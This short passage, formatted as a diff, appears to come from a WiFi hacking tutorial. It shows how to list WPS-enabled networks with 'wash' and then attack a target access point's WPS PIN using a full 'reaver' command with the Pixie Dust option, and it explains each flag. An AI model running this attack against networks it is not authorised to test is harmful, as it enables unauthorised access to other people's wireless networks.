@@ -1,0 +1,10 @@
+Now we can see the BSSID of the devices that near to us and you can also use               wash -i wlan0mon to display all WPS enabled WiFi networks.
+
+We have gathered all the required information, now time to attack from Reaver.
+
+reaver -i wlan0mon -b DC:EF:09:17:9A:2C –vvv -K 1
+
+-i  Indicates interface
+-b BSSID of the target AP
+-v verbose
+-K Run pixiewps
